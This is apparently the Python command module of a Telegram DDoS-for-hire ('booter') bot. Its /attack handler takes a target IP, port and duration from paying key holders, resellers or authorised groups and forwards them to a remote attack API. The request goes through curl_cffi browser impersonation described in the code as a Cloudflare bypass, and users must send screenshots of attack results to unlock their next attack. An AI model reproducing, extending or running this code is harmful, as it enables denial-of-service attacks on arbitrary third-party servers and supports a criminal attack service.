import asyncio, aiohttp, time, os, random, html
import sys, requests
# Ensure system site-packages are in path (needed for PM2 environment)
if '/usr/local/lib/python3.10/dist-packages' not in sys.path:
    sys.path.insert(0, '/usr/local/lib/python3.10/dist-packages')
try:
    from curl_cffi import requests as cf_requests
    USE_CURL_CFFI = True
    print("[PM2-ATTACK] [init] curl_cffi loaded - Cloudflare bypass ACTIVE", flush=True)
except Exception as e:
    USE_CURL_CFFI = False
    print(f"[PM2-ATTACK] [init] curl_cffi FAILED ({type(e).__name__}: {e}) - using plain requests", flush=True)
from functools import partial
from telegram import Update
from telegram.ext import ContextTypes
from helpers import is_admin, is_owner, is_any_admin, is_reseller, make_progress_bar, HTML_EMOJI
import database as db

# ──── Shared runtime state ────────────────────────────────────────────────────────────────────
active_attacks    = {}   # key -> info dict
attack_tasks      = {}   # key -> asyncio.Task
live_status_tasks = {}   # chat_id -> asyncio.Task

VIDEO_DIR = os.path.join(os.path.dirname(__file__), "video")


async def get_random_video_item() -> dict | None:
    """Pick a random video from PostgreSQL database (by file_id) OR from local video/ folder.
    Returns dict: {"type": "db"|"file", "value": file_id_or_path, "file_type": "video"|"animation"}"""
    # 1. Check PostgreSQL database first
    db_videos = await db.get_all_attack_videos()
    if db_videos:
        chosen = random.choice(db_videos)
        return {"type": "db", "value": chosen["file_id"], "file_type": chosen.get("file_type", "video")}

    # 2. Fallback to local files in video/ directory
    if os.path.exists(VIDEO_DIR):
        videos = [
            os.path.join(VIDEO_DIR, f)
            for f in os.listdir(VIDEO_DIR)
            if f.lower().endswith((".mp4", ".mov", ".mkv", ".webm"))
        ]
        if videos:
            return {"type": "file", "value": random.choice(videos), "file_type": "video"}

    return None



# ──── Helpers ──────────────────────────────────────────────────────────────────────────────────────────────

def format_attack_msg(target_ip, port, duration, remaining, user_mention):
    elapsed = duration - remaining
    bar     = make_progress_bar(elapsed, duration)
    mins    = remaining // 60
    secs    = remaining % 60
    return (
        f"{HTML_EMOJI.FIRE} <b>ATTACK IN PROGRESS</b> {HTML_EMOJI.FIRE}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{HTML_EMOJI.TARGET} <b>Target</b>    : <code>{target_ip}:{port}</code>\n"
        f"{HTML_EMOJI.PROFILE} <b>User</b>      : {user_mention}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{HTML_EMOJI.HOURGLASS} <b>Time Left</b> : <code>{mins:02d}:{secs:02d}</code> / <code>{duration}s</code>\n"
        f"{HTML_EMOJI.STATS} <b>Progress</b>  : <code>{bar}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{HTML_EMOJI.REFRESH} <i>Live updating every 3s...</i>"
    )


def build_status_text():
    if not active_attacks:
        return f"{HTML_EMOJI.INFO} <b>No attacks are currently active.</b>"
    lines = [f"{HTML_EMOJI.STATS} <b>Live Attack Status ── {len(active_attacks)} active</b>\n"]
    for i, (_, data) in enumerate(active_attacks.items(), 1):
        remaining = data.get("remaining", data["duration"])
        elapsed   = data["duration"] - remaining
        bar       = make_progress_bar(elapsed, data["duration"], width=14)
        mins      = remaining // 60
        secs      = remaining % 60
        lines.append(
            f"<b>#{i}</b> ── <code>{data['target']}:{data['port']}</code>\n"
            f"   {HTML_EMOJI.PROFILE} {data['user']}\n"
            f"   {HTML_EMOJI.HOURGLASS} <code>{mins:02d}:{secs:02d}</code> left of <code>{data['duration']}s</code>\n"
            f"   {HTML_EMOJI.STATS} <code>{bar}</code>\n"
        )
    lines.append(f"{HTML_EMOJI.REFRESH} <i>Live updating every 3s...</i>")
    return "\n".join(lines)



# ──── Background workers ────────────────────────────────────────────────────────────────────────

async def _attack_worker(context, chat_id, msg_id, attack_key,
                         target_ip, port, duration, user_mention, user_id):
    api_url = await db.get_setting("api_url") or "https://automation.delvorn.in/attack"
    api_key = await db.get_setting("api_key") or ""
    params = {"ip": target_ip, "port": str(port), "time": str(duration)}
    if api_key:
        params["key"] = api_key

    print(f"\n[PM2-ATTACK] >>> Sending Attack Request to: {api_url}", flush=True)
    print(f"[PM2-ATTACK] >>> Query Params: {params}", flush=True)

    api_ok, api_resp = False, ""

    # Cloudflare bypass: curl_cffi (real TLS fingerprint) > plain requests
    def _do_request():
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        }
        if USE_CURL_CFFI:
            r = cf_requests.get(api_url, params=params, headers=headers, impersonate="chrome124", timeout=15)
            return r.status_code, r.text
        else:
            r = requests.get(api_url, params=params, headers=headers, timeout=15)
            return r.status_code, r.text

    try:
        loop = asyncio.get_event_loop()
        status_code, api_resp = await loop.run_in_executor(None, _do_request)
        api_ok = (status_code == 200)
        print(f"[PM2-ATTACK] [requests] <<< Response Code: {status_code}", flush=True)
        print(f"[PM2-ATTACK] [requests] <<< Response Body: {api_resp[:300]}", flush=True)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        api_resp = str(e)
        print(f"[PM2-ATTACK] !!! requests exception: {e}", flush=True)

    if not api_ok:
        try: await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception: pass
        active_attacks.pop(attack_key, None)
        attack_tasks.pop(attack_key, None)
        
        # Clean up response if it's HTML (e.g. Cloudflare / nginx error)
        if "<html" in api_resp.lower() or "just a moment" in api_resp.lower():
            clean_err = "Cloudflare Security Challenge Blocked (Check VPS IP/Headers)"
        else:
            clean_err = api_resp[:200].replace("`", "")

        await context.bot.send_message(
            chat_id=chat_id,
            text=f"{HTML_EMOJI.CROSS} <b>API Error!</b>\n<code>{html.escape(clean_err)}</code>",
            parse_mode="HTML"
        )
        return

    # Countdown with 3s refresh rate to prevent 429 Too Many Requests
    remaining = duration
    step = 3
    is_video = active_attacks.get(attack_key, {}).get("is_video", False)

    while remaining > 0:
        if attack_key not in active_attacks:
            return
        active_attacks[attack_key]["remaining"] = remaining
        formatted_text = format_attack_msg(target_ip, port, duration, remaining, user_mention)
        try:
            if is_video:
                await context.bot.edit_message_caption(
                    chat_id=chat_id, message_id=msg_id,
                    caption=formatted_text,
                    parse_mode="HTML"
                )
            else:
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id,
                    text=formatted_text,
                    parse_mode="HTML"
                )
        except asyncio.CancelledError:
            raise
        except Exception as e:
            err_str = str(e).lower()
            # If "there is no text in the message to edit", it was sent as media/caption
            if "no text in the message to edit" in err_str:
                is_video = True
                if attack_key in active_attacks:
                    active_attacks[attack_key]["is_video"] = True
                try:
                    await context.bot.edit_message_caption(chat_id=chat_id, message_id=msg_id, caption=formatted_text, parse_mode="HTML")
                except Exception:
                    pass
            elif "no caption in the message to edit" in err_str:
                is_video = False
                if attack_key in active_attacks:
                    active_attacks[attack_key]["is_video"] = False
                try:
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=formatted_text, parse_mode="HTML")
                except Exception:
                    pass
            else:
                # If rate-limited or formatting failed, try without HTML
                try:
                    clean_text = formatted_text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "").replace("<i>", "").replace("</i>", "")
                    if is_video:
                        await context.bot.edit_message_caption(chat_id=chat_id, message_id=msg_id, caption=clean_text)
                    else:
                        await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=clean_text)
                except Exception:
                    pass

        sleep_time = min(step, remaining)
        remaining -= sleep_time
        await asyncio.sleep(sleep_time)


    # Done ── delete countdown message, update stats, handle feedback
    try: await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
    except Exception: pass

    active_attacks.pop(attack_key, None)
    attack_tasks.pop(attack_key, None)

    # Update user stats
    u = await db.get_user(user_id)
    if u:
        await db.update_user_attack(user_id, int(time.time()), u["attacks_count"] + 1)

    # Set feedback pending if feedback is ON
    feedback_on = (await db.get_setting("feedback")).lower() == "true"
    if feedback_on and not is_owner(user_id):
        await db.set_feedback_pending(user_id, True)
        feedback_notice = f"\n\n{HTML_EMOJI.CAMERA} <b>Send a screenshot to unlock your next attack!</b>"
    else:
        feedback_notice = ""

    # Send Attack Completed notification safely
    for _ in range(3):
        try:
            await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"{HTML_EMOJI.CHECKMARK} <b>Attack Completed!</b> {HTML_EMOJI.COOL}\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"{HTML_EMOJI.TARGET} <b>Target</b>   : <code>{target_ip}:{port}</code>\n"
                    f"{HTML_EMOJI.HOURGLASS} <b>Duration</b> : <code>{duration}s</code>\n"
                    f"{HTML_EMOJI.PROFILE} <b>By</b>       : {user_mention}\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"{HTML_EMOJI.EXPLOSION} Attack finished successfully!{feedback_notice}"
                ),
                parse_mode="HTML"
            )
            break
        except asyncio.CancelledError:
            raise
        except Exception as e:
            # If rate-limited, wait requested seconds or 3s and retry
            retry_sec = getattr(e, "retry_after", 3)
            await asyncio.sleep(retry_sec)



async def _live_status_worker(context, chat_id, msg_id):
    global live_status_tasks
    try:
        while True:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id,
                    text=build_status_text(), parse_mode="HTML"
                )
            except Exception:
                pass
            if not active_attacks:
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=msg_id,
                        text=f"{HTML_EMOJI.CHECKMARK} <b>All attacks have finished.</b>", parse_mode="HTML"
                    )
                except Exception:
                    pass
                break
            await asyncio.sleep(3)
    except asyncio.CancelledError:
        pass
    finally:
        live_status_tasks.pop(chat_id, None)



# ──── Command handlers ────────────────────────────────────────────────────────────────────────────

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user    = update.effective_user
    user_id = user.id if user else 0
    chat    = update.effective_chat

    is_owner_user    = is_owner(user_id)
    is_admin_user    = await is_any_admin(user_id)
    is_reseller_user = await is_reseller(user_id)

    # ── Maintenance check (Owner sets it; applies to Admin, Reseller & Users) ──
    if not is_owner_user:
        maint = (await db.get_setting("maintenance")).lower() == "true"
        if maint:
            return await update.message.reply_text(
                f"{HTML_EMOJI.STOP} <b>Maintenance Mode Active!</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{HTML_EMOJI.WARN} <code>/attack</code> command is currently disabled in all groups and private chats.\n"
                f"{HTML_EMOJI.SETTINGS} Our servers are undergoing maintenance and will resume shortly.",
                parse_mode="HTML"
            )

    # ──── Auth checks ────────────────────────────────────────────
    if await db.is_banned(user_id):
        return await update.message.reply_text(f"{HTML_EMOJI.BAN} <b>You are banned from using this bot.</b>", parse_mode="HTML")

    # ──── Group vs Private check ──────────────────────
    is_group = chat.type in ("group", "supergroup")
    grp = None

    if is_group:
        grp = await db.get_group(chat.id)
        if not grp:
            return await update.message.reply_text(f"{HTML_EMOJI.BAN} <b>Group Unauthorized!</b>\nThis group is not authorized to use the bot.\nContact admin to authorize using <code>/approvegroup</code>.", parse_mode="HTML")
        if grp.get("expiry", 0) > 0 and int(time.time()) > grp["expiry"]:
            return await update.message.reply_text(f"{HTML_EMOJI.CROSS} <b>Group Authorization Expired!</b>\nThis group's authorization has expired. Contact admin.", parse_mode="HTML")

    # ──── User Auth checks ──────────────────────────────────
    # Ensure user record exists in DB for proper cooldown & feedback tracking
    u = await db.get_user(user_id) if not is_owner_user else None
    if not is_owner_user and not u:
        uname = user.username or user.first_name or "" if user else ""
        await db.upsert_user(user_id=user_id, username=uname, join_date=int(time.time()))
        u = await db.get_user(user_id)

    # In private chat: user must have key, OR be a reseller/admin
    if not is_group and not is_owner_user and not is_admin_user and not is_reseller_user:
        if not u or not u.get("key_used"):
            return await update.message.reply_text(
                f"{HTML_EMOJI.CROSS} <b>Access Denied!</b>\nPlease redeem a valid key first: <code>/redeem &lt;code&gt;</code>\nOr use the bot inside an authorized group!",
                parse_mode="HTML"
            )
        if u["expiry"] > 0 and int(time.time()) > u["expiry"]:
            return await update.message.reply_text(f"{HTML_EMOJI.CROSS} <b>Your access has expired!</b> Contact admin to renew.", parse_mode="HTML")

    # Feedback pending check ── strictly block attack if screenshot not submitted
    feedback_on = (await db.get_setting("feedback")).lower() == "true"
    if feedback_on and not is_owner_user:
        if u and u.get("feedback_pending", False):
            return await update.message.reply_text(
                f"{HTML_EMOJI.CAMERA} <b>Feedback Required!</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "You must send a screenshot of your previous attack result before launching another attack.\n"
                f"{HTML_EMOJI.ARROW_RIGHT} Please send a screenshot image here to unlock your access.",
                parse_mode="HTML"
            )

    # Cooldown check (Owner sets it; applies to Admin, Reseller & Users)
    if not is_owner_user:
        global_cd = int(await db.get_setting("cooldown"))
        effective_cd = grp.get("cooldown", global_cd) if (is_group and grp) else (u.get("cooldown", global_cd) if u else global_cd)

        last_atk = (u.get("last_attack") or 0) if u else 0
        if effective_cd > 0 and (int(time.time()) - last_atk) < effective_cd:
            wait = effective_cd - (int(time.time()) - last_atk)
            return await update.message.reply_text(
                f"{HTML_EMOJI.HOURGLASS} <b>Cooldown Active!</b> Please wait <code>{wait}s</code> before launching your next attack.", parse_mode="HTML"
            )

    # ──── Args ──────────────────────────────────────────────────────────
    args = context.args
    if not args or len(args) != 3:
        return await update.message.reply_text(
            f"{HTML_EMOJI.WARN} <b>Usage:</b> <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n{HTML_EMOJI.PIN} <b>Example:</b> <code>/attack 1.1.1.1 80 60</code>",
            parse_mode="HTML"
        )

    target_ip, port_str, time_str = args
    if not (port_str.isdigit() and time_str.isdigit()):
        return await update.message.reply_text(f"{HTML_EMOJI.CROSS} Port and Time must be numeric.", parse_mode="HTML")

    port     = int(port_str)
    duration = int(time_str)

    if port < 1 or port > 65535:
        return await update.message.reply_text(f"{HTML_EMOJI.CROSS} Port must be 1──65535.", parse_mode="HTML")

    if duration < 30:
        return await update.message.reply_text(f"{HTML_EMOJI.CROSS} Minimum attack duration is <code>30s</code>.", parse_mode="HTML")

    # Max attack duration check (Owner sets it; applies to Admin, Reseller & Users)
    if not is_owner_user:
        global_max = int(await db.get_setting("max_time"))
        allowed_max = grp.get("max_time", global_max) if (is_group and grp) else (u.get("max_time", global_max) if u else global_max)
        # Never exceed global_max unless admin
        allowed_max = min(allowed_max, global_max)
        if duration > allowed_max:
            return await update.message.reply_text(
                f"{HTML_EMOJI.CROSS} Max allowed attack time is <code>{allowed_max}s</code> (Allowed: <code>30</code> to <code>{allowed_max}s</code>).", parse_mode="HTML"
            )

    # Port protection
    port_prot = (await db.get_setting("port_protection")).lower() == "true"
    if port_prot and await db.is_port_blocked(target_ip, port):
        if not is_owner_user:
            return await update.message.reply_text(f"{HTML_EMOJI.BAN} <b>This IP:Port is blocked!</b>", parse_mode="HTML")

    # Duplicate check
    if any(d["target"] == target_ip and d["port"] == port for d in active_attacks.values()):
        return await update.message.reply_text(
            f"{HTML_EMOJI.WARN} <b>Already Running!</b> An attack on <code>{html.escape(target_ip)}:{port}</code> is already active.",
            parse_mode="HTML"
        )

    # Concurrency limit ── strictly use bot concurrent setting for both groups and bot
    max_conc = int(await db.get_setting("concurrent"))
    if len(active_attacks) >= max_conc:
        return await update.message.reply_text(
            f"{HTML_EMOJI.WARN} <b>Concurrency Limit!</b> Max <code>{max_conc}</code> concurrent attacks allowed.",
            parse_mode="HTML"
        )

    # ──── Launch ────────────────────────────────────────────────────────
    user_mention = user.mention_html() if user else "User"
    attack_key   = f"{user_id}_{target_ip}_{port}_{int(time.time())}"

    launch_text = (
        f"{HTML_EMOJI.ALERT} <b>Launching Attack...</b> {HTML_EMOJI.FIRE}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{HTML_EMOJI.TARGET} <b>Target</b>   : <code>{target_ip}:{port}</code>\n"
        f"{HTML_EMOJI.HOURGLASS} <b>Duration</b> : <code>{duration}s</code>\n"
        f"{HTML_EMOJI.PROFILE} <b>User</b>     : {user_mention}\n"
        f"{HTML_EMOJI.DELVORN} <i>Delvorn Power Online</i>"
    )

    sent = None
    is_video = False

    # Send random animated video/GIF with caption ONLY in Groups
    if is_group:
        v_item = await get_random_video_item()
        if v_item:
            v_val = v_item["value"]
            v_type = v_item.get("file_type", "video")

            if v_item["type"] == "db":
                # Instant send by Telegram file_id (no upload delay / no RAM usage)
                try:
                    if v_type == "animation":
                        sent = await update.message.reply_animation(
                            animation=v_val,
                            caption=launch_text,
                            parse_mode="HTML"
                        )
                    else:
                        sent = await update.message.reply_video(
                            video=v_val,
                            caption=launch_text,
                            parse_mode="HTML",
                            supports_streaming=True
                        )
                    is_video = True
                except Exception:
                    sent = None
                    is_video = False
            else:
                # File on disk
                try:
                    with open(v_val, "rb") as vf:
                        sent = await update.message.reply_animation(
                            animation=vf,
                            caption=launch_text,
                            parse_mode="HTML"
                        )
                        is_video = True
                except Exception:
                    try:
                        with open(v_val, "rb") as vf:
                            sent = await update.message.reply_video(
                                video=vf,
                                caption=launch_text,
                                parse_mode="HTML",
                                supports_streaming=True
                            )
                            is_video = True
                    except Exception:
                        sent = None
                        is_video = False

    # Fallback or for private DM: normal text message
    if not sent:
        sent = await update.message.reply_text(
            launch_text,
            parse_mode="HTML"
        )
        is_video = False

    active_attacks[attack_key] = {
        "target":    target_ip,
        "port":      port,
        "duration":  duration,
        "remaining": duration,
        "user":      user_mention,
        "chat_id":   chat.id,
        "msg_id":    sent.message_id,
        "is_video":  is_video,
    }

    task = asyncio.create_task(
        _attack_worker(context, chat.id, sent.message_id,
                       attack_key, target_ip, port, duration, user_mention, user_id)
    )
    attack_tasks[attack_key] = task


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_status_tasks
    user_id = update.effective_user.id if update.effective_user else 0
    chat_id = update.effective_chat.id

    if await db.is_banned(user_id):
        return await update.message.reply_text(f"{HTML_EMOJI.BAN} <b>You are banned from using this bot.</b>", parse_mode="HTML")

    chat = update.effective_chat
    is_group = chat.type in ("group", "supergroup")

    if is_group:
        grp = await db.get_group(chat.id)
        if not grp:
            return await update.message.reply_text(f"{HTML_EMOJI.BAN} <b>Group Unauthorized!</b>\nThis group is not authorized to use the bot.\nAsk admin to authorize using <code>/approvegroup</code>.", parse_mode="HTML")
        if grp.get("expiry", 0) > 0 and int(time.time()) > grp["expiry"]:
            return await update.message.reply_text(f"{HTML_EMOJI.CROSS} <b>Group Authorization Expired!</b>\nThis group's authorization has expired.", parse_mode="HTML")

    # In private chat, only users with active key or admin can see status
    if not is_group and not is_admin(user_id):
        u = await db.get_user(user_id)
        if not u:
            return await update.message.reply_text(
                f"{HTML_EMOJI.CROSS} <b>Access Denied!</b>\n"
                "You do not have an active VIP subscription.\n"
                "Please purchase a key and use <code>/redeem &lt;code&gt;</code>, or use the bot in an authorized group.",
                parse_mode="HTML"
            )
        if u["expiry"] > 0 and int(time.time()) > u["expiry"]:
            return await update.message.reply_text(
                f"{HTML_EMOJI.CROSS} <b>Your access has expired!</b>\nPlease purchase a new key from Admin.",
                parse_mode="HTML"
            )

    old = live_status_tasks.pop(chat_id, None)
    if old and not old.done():
        old.cancel()

    if not active_attacks:
        return await update.message.reply_text(f"{HTML_EMOJI.CHECKMARK} <b>No attacks are currently active.</b>", parse_mode="HTML")

    sent = await update.message.reply_text(build_status_text(), parse_mode="HTML")
    task = asyncio.create_task(_live_status_worker(context, chat_id, sent.message_id))
    live_status_tasks[chat_id] = task


async def ping_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start = time.time()
    msg   = await update.message.reply_text(f"{HTML_EMOJI.LIGHTNING} Pinging...", parse_mode="HTML")
    ms    = int((time.time() - start) * 1000)
    await msg.edit_text(f"{HTML_EMOJI.LIGHTNING} <b>Pong!</b> <code>{ms}ms</code>", parse_mode="HTML")


async def getid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update.effective_user else 0
    chat_id = update.effective_chat.id if update.effective_chat else 0
    await update.message.reply_text(
        f"{HTML_EMOJI.PROFILE} <b>Your User ID:</b> <code>{user_id}</code>\n{HTML_EMOJI.COOL} <b>Chat ID:</b> <code>{chat_id}</code>",
        parse_mode="HTML"
    )


async def setvideo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin sends /setvideo in the caption of a video/animation or replies to one.
    Saves the video directly into PostgreSQL database (attack_videos table) and to video/ folder."""
    user_id = update.effective_user.id if update.effective_user else 0
    if not is_admin(user_id):
        return await update.message.reply_text(f"{HTML_EMOJI.BAN} <b>Admin only.</b>", parse_mode="HTML")

    message = update.message
    video_obj = None
    file_type = "video"

    if message.video:
        video_obj = message.video
        file_type = "video"
    elif message.animation:
        video_obj = message.animation
        file_type = "animation"
    elif message.document and message.document.mime_type and "video" in message.document.mime_type:
        video_obj = message.document
        file_type = "video"
    elif message.reply_to_message:
        replied = message.reply_to_message
        if replied.video:
            video_obj = replied.video
            file_type = "video"
        elif replied.animation:
            video_obj = replied.animation
            file_type = "animation"
        elif replied.document and replied.document.mime_type and "video" in replied.document.mime_type:
            video_obj = replied.document
            file_type = "video"

    if not video_obj:
        return await update.message.reply_text(
            f"{HTML_EMOJI.WARN} <b>Usage:</b>\n"
            "Send a video/animation with <code>/setvideo</code> in the caption,\n"
            "OR reply to an existing video with <code>/setvideo</code>.",
            parse_mode="HTML"
        )

    status_msg = await update.message.reply_text(f"{HTML_EMOJI.DOWNLOAD} <b>Saving video to database...</b>", parse_mode="HTML")

    try:
        file_id = video_obj.file_id
        # 1. Insert into PostgreSQL database attack_videos table
        inserted = await db.add_attack_video(file_id, file_type)

        # 2. Also save to disk if possible with accurate incremental numbering
        file_name = "video.mp4"
        try:
            os.makedirs(VIDEO_DIR, exist_ok=True)
            new_file = await context.bot.get_file(file_id)
            
            # Extract all existing number prefixes (e.g. 1.mp4, 2.mp4, ... 13.mp4)
            existing_numbers = []
            for f in os.listdir(VIDEO_DIR):
                base, _ = os.path.splitext(f)
                if base.isdigit():
                    existing_numbers.append(int(base))
            
            next_num = max(existing_numbers) + 1 if existing_numbers else 1
            file_name = f"{next_num}.mp4"
            target_path = os.path.join(VIDEO_DIR, file_name)
            
            await new_file.download_to_drive(custom_path=target_path)
        except Exception:
            pass

        all_db = await db.get_all_attack_videos()
        disk_count = len([f for f in os.listdir(VIDEO_DIR) if f.lower().endswith((".mp4", ".mov", ".mkv", ".webm"))]) if os.path.exists(VIDEO_DIR) else 0

        await status_msg.edit_text(
            f"{HTML_EMOJI.CHECKMARK} <b>Video Saved Successfully!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{HTML_EMOJI.ARCHIVE} <b>Saved as:</b> <code>{html.escape(file_name)}</code>\n"
            f"{HTML_EMOJI.TV} <b>File Type:</b> <code>{file_type.upper()}</code>\n"
            f"{HTML_EMOJI.ARCHIVE} <b>Total Videos in Rotation:</b> <code>{max(len(all_db), disk_count)}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{HTML_EMOJI.LIGHTNING} This video will now automatically play in random rotation during attacks in groups!",
            parse_mode="HTML"
        )
    except Exception as e:
        await status_msg.edit_text(f"{HTML_EMOJI.CROSS} <b>Failed to save video to database:</b> <code>{html.escape(str(e))}</code>", parse_mode="HTML")


